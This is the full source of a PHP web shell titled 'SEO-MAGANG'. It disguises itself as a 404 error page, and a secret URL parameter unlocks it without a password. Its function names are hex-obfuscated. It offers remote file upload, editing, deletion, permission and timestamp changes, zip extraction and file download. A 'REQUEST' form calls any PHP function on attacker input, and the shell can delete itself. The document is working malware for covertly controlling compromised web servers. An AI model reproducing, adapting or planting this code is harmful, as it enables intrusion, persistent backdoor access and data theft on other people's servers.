<?php 
session_start();
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$Array = [
		'7068705f756e616d65',
		'70687076657273696f6e',
		'6368646972',
		'676574637764',
		'707265675f73706c6974',
		'636f7079',
		'66696c655f6765745f636f6e74656e7473',
		'6261736536345f6465636f6465',
		'69735f646972',
		'6f625f656e645f636c65616e28293b',
		'756e6c696e6b',
		'6d6b646972',
		'63686d6f64',
		'7363616e646972',
		'7374725f7265706c616365',
		'68746d6c7370656369616c6368617273',
		'7661725f64756d70',
		'666f70656e',
		'667772697465',
		'66636c6f7365',
		'64617465',
		'66696c656d74696d65',
		'737562737472',
		'737072696e7466',
		'66696c657065726d73',
		'746f756368',
		'66696c655f657869737473',
		'72656e616d65',
		'69735f6172726179',
		'69735f6f626a656374',
		'737472706f73',
		'69735f7772697461626c65',
		'69735f7265616461626c65',
		'737472746f74696d65',
		'66696c6573697a65',
		'726d646972',
		'6f625f6765745f636c65616e',
		'7265616466696c65',
		'617373657274',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
	$GNJ[] = uhex($Array[$i]);
}
if (isset($_GET['seomagang'])) {
    $_SESSION['loggedIn'] = true;
}

if (!isset($_SESSION['loggedIn'])) {
    header("HTTP/1.0 404 Not Found");
    $sourcesrv = $_SERVER['SERVER_NAME'];
    
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address><?php echo $_SERVER['SERVER_SOFTWARE'];?> PHP/<?php echo $GNJ[1]();?> Server at <?php echo $sourcesrv; ?></address>
</body></html>

<?php
exit;
}

?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>SEO-MAGANG</title>

			<link rel="icon" href="https://www.zarla.com/images/zarla-cyberlock-1x1-2400x2400-20220517-kb9vq8y8dkmbyyyk8ctb.png?crop=1:1,smart&width=250&dpr=2" />
			<link rel="stylesheet" href="https://seomagangbg.github.io/bikin_shell/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>
        <style>
    .seo-magang-logo {
        width: 1.2em;
        height: 1.2em; 
        border-radius: 50%;
        margin-left: 10px; 
        vertical-align: middle; 
    }
    .file-folder-container {
    display: flex;
    justify-content: space-between; 
    align-items: center;
    width: 100%;
    margin-bottom: 15px;
}

.file-folder-form {
    flex: 1;
}

.file-folder-form:first-child {
    text-align: left; 
}

.file-folder-form:last-child {
    text-align: right; 
}

.footer {
    text-align: center;
    width: 100%;
    padding: 20px;
    color: white;
    position: relative;
    bottom: 0;
    left: 0;
}

@import url(https://use.fontawesome.com/releases/v5.8.1/css/all.css);
@font-face {
    font-family: i;
    src: url(i.woff2) format('woff2'), url(i.woff) format('woff');
}

html {
    margin-left: 1em;
    margin-right: 1em;
    margin-top: -1.5em;
    background: linear-gradient(45deg,rgb(0, 0, 0), #333);
    font-family: Courier;
}

    body {
        background:rgb(0, 0, 0);
        color: white;
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
    }

    .file-folder-container {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        width: 80%;
        margin: 15px auto;
        text-align: center;
    }

    .left-column, .right-column, .center-column {
        width: 30%;
    }

    .file-folder-form input {
        padding: 10px;
        margin: 15px 0;
        width: 90%;
        border-radius: 8px;
        border: 1px solid #555;
        background-color: #333;
        color: white;
        transition: all 0.3s ease;
    }

    .file-folder-form input::placeholder {
        color: #888;
    }

    .file-folder-form input:focus {
        border-color:rgb(10, 165, 226);
        background-color: #444;
    }

    .file-folder-form button {
        padding: 12px 30px;
        background-color:rgb(10, 165, 226);
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 18px;
        transition: background-color 0.3s ease, transform 0.2s ease;
        margin-top: 10px;
    }

    .file-folder-form button:hover {
        background-color:rgb(10, 165, 226);
        transform: scale(1.05);
    }

    .file-folder-form button:active {
        transform: scale(1.05);
    }

    .terminal {
        width: 100%;
        background: #222;
        border-radius: 6px;
        color:rgb(10, 165, 226);
        padding: 20px;
        font-family: 'Courier New', monospace;
        box-shadow: 4px 0px 10px rgba(255, 0, 0, 0.5);
        transition: background-color 0.3s ease;
    }

    .terminal:hover {
        background: #444;
    }

    .terminal input {
        width: 80%;
        background-color: #1c1c1c;
        color:rgb(10, 165, 226);
        border: none;
        padding: 8px;
        font-family: 'Courier New', monospace;
        border-radius: 10px;
        outline: none;
    }

    .terminal input:focus {
        background-color: #333;
        border: 1px solidrgb(10, 165, 226);
    }

    .footer {
        margin-top: 20px;
        font-size: 16px;
        color: #bbb;
    }

.x {
    text-align: center;
}

.y {
    font-family: i;
    font-size: calc(2.3em + 2.3vw);
}

.ajx {
    color:rgb(10, 165, 226);
}

.y:hover {
    background: rgb(226, 10, 10);
}

.w {
    color:rgb(10, 165, 226);
}

.b {
    color:rgb(10, 165, 226);
}

.q {
    margin-top: .5em;
}

article {
    margin-top: 1.5em;
    font-size: .9em;
    
}

.i {
    float: left;
}

.u {
    float: right;
    text-align: right;
    margin-bottom: 1.5em;
}

input[type=file] {
    display: none;
}

input[type=submit] {
    border: 1px solidrgb(255, 255, 255);
    padding: .2em;
    background:rgb(228, 2, 2);
}

td {
    color:rgb(10, 165, 226);
}

th {
    font-weight: 400;
    border-bottom: thin solidrgb(255, 255, 255);
    color:rgb(151, 8, 8);
}

.et {
    text-align: left;
    color:rgb(228, 2, 2);
}

.r:hover {
    background:rgb(153, 7, 7);
}

.l {
    border: 1px solidrgb(255, 255, 255);
    padding: 1px;
    background: 0 0;
}

footer {
    margin-top: 2em;
    height: 2.2rem;
    width: 100%;
    font-size: .9em;
}

th.et a[href*="q"] {
    color: rgb(0, 193, 252) !important;
}


footer:hover {
    background: rgb(0, 193, 252);
}

a {
    text-decoration:solid;
}

a:hover {
    background: rgb(0, 0, 0);
}

.m {
    margin-left: 2.4em;
}

textarea {
    background: rgb(194, 4, 4);
    border: none;
    width: 70%;
    height: 30em;
    font-family: Courier;
    font-size: .9em;
}

td.x a {
    color: rgb(0, 193, 252) !important;
}


table {
    background-color: rgb(0, 0, 0);
}

th, td {
    border: 1px solid  rgb(40, 56, 45);
}
.h {
    color: #ea2027;
}

</style>


		<body>
			<header>
                <br><br>
				<div class="y x">
					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
						SEO-MAGANG
					</a>
                    <img src="https://res.cloudinary.com/dl3zftjze/image/upload/v1741899346/sm.png" alt="Seo magang" class="seo-magang-logo">
				</div>

				<div class="q x w">
					 UJI &#8212; COBA 
				</div>
				
				
			</header>


			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php echo $GNJ[0]();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>

					<br />

					<i class="far fa-folder"></i>
					
					<?php
					if(isset($_GET["d"])) {
						$d = uhex($_GET["d"]);
						$GNJ[2](uhex($_GET["d"]));
					}
					else {
						$d = $GNJ[3]();
					}
					$k = $GNJ[4]("/(\\\|\/)/", $d );
					foreach ($k as $m => $l) { 
						if($l=='' && $m==0) {
							echo '<a class="ajx" href="?d=2f">/</a>';
						}
						if($l == '') { 
							continue;
						}
						echo '<a class="ajx" href="?d=';
						for ($i = 0; $i <= $m; $i++) {
							echo hex($k[$i]); 
							if($i != $m) {
								echo '2f';
							}
						}
						echo '">'.$l.'</a>/'; 
					}
					?>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					<?php
					$o_ = [ 
							'<script>$.notify("',
							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
						];
					$f = $o_[0].'OK!'.$o_[1];
					$g = $o_[0].'ER!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
							if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
								echo $f;
							}
							else {
								echo $g;
							}
						}
					}
					?>

				</div>
				
					<?php
					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
					$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
					$c_ = '</td>
							</tr>
						</tbody>
					</table>';
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									<textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif(isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="x" type="text" name="1" />&nbsp;&nbsp;
										<input class="x" type="text" name="2" />
										'.$d_.'
									<br />
									<textarea readonly="yes">';

									if(isset($_POST["2"])) {
										echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
									}

								echo '</textarea>
								'.$c_;
					}
					elseif(isset($_GET["e"])) {
						echo $a_.uhex($_GET["e"]).$b_.'
									<form method="post">
										<textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<select id="b64" name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										'.$d_.'
								'.$c_.'
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
					if(isset($_POST["e"])) {
						if($_POST["b64"] == "1") {
							$ex = $GNJ[7]($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$fp = $GNJ[17](uhex($_GET["e"]), 'w');
						if($GNJ[18]($fp, $ex)) {
							OK();
						}
						else {
							ER();
						}
						$GNJ[19]($fp);
					  }
					}
					elseif(isset($_GET["x"])) {
						rec(uhex($_GET["x"]));
						if($GNJ[26](uhex($_GET["x"]))) {
							ER();
						}
						else {
							OK();
						}

					}
					elseif(isset($_GET["t"])) {
						echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;
					if( !empty($_POST["t"]) ) {
						$p = $GNJ[33]($_POST["t"]);
						if($p) {
							if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
								ER();
							}
							else {
								OK();
							}
						}
						else {
							ER();
						}
					  }
					}
					elseif(isset($_GET["k"])) {
						echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
										'.$d_.'
								'.$c_;
					if(!empty($_POST["b"])) {
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!$GNJ[12](uhex($_GET["k"]), $t)) {
						ER();
					}
					else {
						OK();
						  }
						}
					}
					elseif(isset($_GET["l"])) {
						echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["l"])) {
						if(!$GNJ[11]($_POST["l"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["q"])) {
						if($GNJ[10](__FILE__)) {
							$GNJ[38]($GNJ[9]);
							header("Location: ".basename($_SERVER['PHP_SELF'])."");
							exit();
						}
						else {
							echo $g;
						}
					}
					elseif(isset($_GET["n"])) {
						echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["n"])) {
						if(!$GNJ[25]($_POST["n"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["r"])) {
						echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;
					if(isset($_POST["r"])) {
						if($GNJ[26]($_POST["r"])) {
							ER();
						}
						else {
							if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
								OK();
							}
							else {
								ER();
							}
						  }
					   }
					}
					elseif(isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open(uhex($_GET["z"]));
							if($res === TRUE) {
								$zip->extractTo(uhex($_GET["d"]));
								$zip->close();
								OK();
							} else {
								ER();
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
						';

							$h = "";
							$j = "";
							$w = $GNJ[13]($d);
							if($GNJ[28]($w) || $GNJ[29]($w)) {
							foreach($w as $c){
								$e = $GNJ[14]("\\", "/", $d);
								if(!$GNJ[30]($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if($GNJ[31]("$d/$c")) {
										$o = "";
								}
								elseif(!$GNJ[32]("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$s = $GNJ[34]("$d/$c") / 1024;
								$s = round($s, 3);
								if($s>=1024) { 
									$s = round($s/1024, 2) . " MB";
								} else {
									$s = $s . " KB";
								}
							if(($c != ".") && ($c != "..")){
								($GNJ[8]("$d/$c")) ?
								$h .= '<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						'
							:
								$j .= '<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						';

							}
						}
					}

						echo $h;
						echo $j;
						echo '</tbody>
						<tfoot>
							<tr>
								<th class="et">
									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
									<a href="?d='.hex($e).'&q">EXIT</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
					</tfoot>
				</table>';
					}
					?>
			</article>

            <br>

                <?php
                if (isset($_POST['create_file'])) {
                    $filename = $_POST['filename'];
                    if (!empty($filename)) {
                        file_put_contents($filename, "");
                    }
                    header("Location: " . $_SERVER['PHP_SELF']);
                    exit;
                }
                
           
                if (isset($_POST['create_folder'])) {
                    $foldername = $_POST['foldername'];
                    if (!empty($foldername)) {
                        mkdir($foldername);
                    }
                    header("Location: " . $_SERVER['PHP_SELF']);
                    exit;
                }
                ?>

<!-- tools -->
<div class="file-folder-container">
    <div class="left-column">
        <form method="POST" class="file-folder-form" id="create-file-form">
            <input type="text" name="filename" id="filename" placeholder="Nama File">
            <button type="submit" name="create_file">Buat File</button>
        </form>
    </div>

    <div class="center-column">
        <div class="terminal">
            <p>Masukkan Perintah:</p>
            <input type="text" id="terminal-input" placeholder="Type command here..." onkeydown="handleCommand(event)">
            <div id="terminal-output"></div> 
        </div>
    </div>

    <div class="right-column">
        <form method="POST" class="file-folder-form" id="create-folder-form">
            <input type="text" name="foldername" id="foldername" placeholder="Nama Folder">
            <button type="submit" name="create_folder">Buat Folder</button>
        </form>
    </div>
</div>

<footer class="footer">
    NOTED!!! 
    <br>
    R=Rename, E=Edit, G=Get_File, U=Upload, D=Delete
</footer>




<?php
	function rec($j) {
		global $GNJ;
		if(trim(pathinfo($j, PATHINFO_BASENAME ), '.') === '') {
			return;
		}
		if($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		}
		else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2) {
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n) {
		$y='';
		for ($i=0; $i < strlen($n); $i++){
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y) {
		$n='';
		for ($i=0; $i < strlen($y)-1; $i+=2){
			$n .= chr(hexdec($y[$i].$y[$i+1]));
		}
		return $n;
	}
	function OK() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&1");
		exit();
	}
	function ER() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&0");
		exit();
	}
	function x($c) {
		global $GNJ;
		$x = $GNJ[24]($c);
		if(($x & 0xC000) == 0xC000) {
			$u = "s";
		}
		elseif(($x & 0xA000) == 0xA000) {
			$u = "l";
		}
		elseif(($x & 0x8000) == 0x8000) {
			$u = "-";
		}
		elseif(($x & 0x6000) == 0x6000) {
			$u = "b";
		}
		elseif(($x & 0x4000) == 0x4000) {
			$u = "d";
		}
		elseif(($x & 0x2000) == 0x2000) {
			$u = "c";
		}
		elseif(($x & 0x1000) == 0x1000) {
			$u = "p";
		}
		else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if(isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
		$GNJ[37](uhex($_GET["g"]));
	}
?>